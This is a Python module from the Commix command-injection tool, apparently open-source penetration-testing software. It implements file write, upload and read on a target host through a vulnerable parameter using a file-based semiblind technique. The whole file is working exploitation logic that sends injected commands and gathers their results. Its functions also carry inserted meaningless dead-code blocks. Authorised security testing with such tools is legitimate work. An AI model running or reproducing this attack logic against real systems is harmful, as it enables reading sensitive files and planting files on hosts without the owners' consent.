"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2023 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""
import re
import os
import sys
from src.utils import menu
from src.utils import settings
from src.utils import session_handler
from src.core.injections.controller import checks
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.semiblind.techniques.file_based import fb_injector
'\nThe "file-based" technique on semiblind OS command injection.\n'
'\nWrite to a file on the target host.\n'

def file_write(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
    if False:
        print('Hello World!')
    (file_to_write, dest_to_write, content) = checks.check_file_to_write()
    if settings.TARGET_OS == settings.OS.WINDOWS:
        cmd = checks.change_dir(dest_to_write)
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        (fname, tmp_fname, cmd) = checks.find_filename(dest_to_write, content)
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        cmd = checks.win_decode_b64_enc(fname, tmp_fname)
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        cmd = checks.delete_tmp(tmp_fname)
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    else:
        cmd = checks.write_content(content, dest_to_write)
        cmd = cmd + settings.COMMENT
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
        shell = ''.join((str(p) for p in shell))
    cmd = checks.check_file(dest_to_write)
    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
    shell = ''.join((str(p) for p in shell))
    checks.file_write_status(shell, dest_to_write)
'\nUpload a file on the target host.\n'

def file_upload(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
    if False:
        for i in range(10):
            print('nop')
    (cmd, dest_to_upload) = checks.check_file_to_upload()
    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
    shell = ''.join((str(p) for p in shell))
    cmd = checks.check_file(dest_to_upload)
    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
    shell = ''.join((str(p) for p in shell))
    checks.file_upload_status(shell, dest_to_upload)
'\nRead a file from the target host.\n'

def file_read(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
    if False:
        print('Hello World!')
    (cmd, file_to_read) = checks.file_content_to_read()
    if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
        shell = ''.join((str(p) for p in shell))
        session_handler.store_cmd(url, cmd, shell, vuln_parameter)
    else:
        shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
    checks.file_read_status(shell, file_to_read, filename)
'\nCheck the defined options\n'

def do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
    if False:
        i = 10
        return i + 15
    if menu.options.file_write:
        file_write(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        settings.FILE_ACCESS_DONE = True
    if menu.options.file_upload:
        if settings.TARGET_OS == settings.OS.WINDOWS:
            check_option = '--file-upload'
            checks.unavailable_option(check_option)
        else:
            file_upload(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        settings.FILE_ACCESS_DONE = True
    if menu.options.file_read:
        file_read(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
        settings.FILE_ACCESS_DONE = True